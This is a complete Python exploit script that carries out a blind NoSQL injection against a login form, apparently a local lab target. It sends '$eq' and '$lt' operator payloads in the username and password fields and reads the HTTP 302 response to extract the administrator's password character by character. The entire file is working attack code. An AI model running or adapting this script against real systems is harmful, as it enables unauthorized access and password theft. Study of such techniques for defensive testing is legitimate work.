import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

u="http://localhost/nosql-blind/"
headers= {'Content-Type': 'application/x-www-form-urlencoded'}

username="administrator"
password=""

resp = True
while True:
    if resp:
        resp = False
    else:
        break
    for c in range(33,128):
        #eleminate bad chars
        if chr(c) not in ['*','+','.','?','|']:
            payload='username[$eq]=%s&password[$lt]=%s&login=login' % (username,password+chr(c))
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if  r.status_code == 302:
                resp = True
                test = password+chr(c)
                print(test)
                if chr(c-1) in '*+.?|':
                    print("Found one more char : %s" % (password + chr(c- 2))) 
                    password = password + chr(c - 2)
                else:     
                    print("Found one more char : %s" % (password + chr(c- 1))) 
                    password = password + chr(c - 1)
                break